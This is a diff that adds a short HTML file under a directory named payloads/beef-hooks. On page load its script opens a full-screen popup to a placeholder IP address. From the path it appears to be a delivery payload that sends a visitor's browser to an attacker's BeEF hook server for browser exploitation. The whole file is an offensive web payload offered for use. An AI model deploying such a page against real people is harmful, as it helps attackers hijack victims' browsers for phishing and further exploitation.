+++ payloads/beef-hooks/beef_auto-pop
@@ -1,0 +1,16 @@
+<html>
+  <head>
+    <script type="text/javascript">
+    window.onload = function popup() 
+    {
+     params  = 'width='+screen.width;
+     params += ', height='+screen.height;
+     params += ', top=0, left=0'
+     params += ', scrollbars=yes'
+     params += ', fullscreen=yes';
+
+     newwin=window.open('http://<ip-address>','windowname4', params);
+    }
+    </script>
+  </head>
+</html>
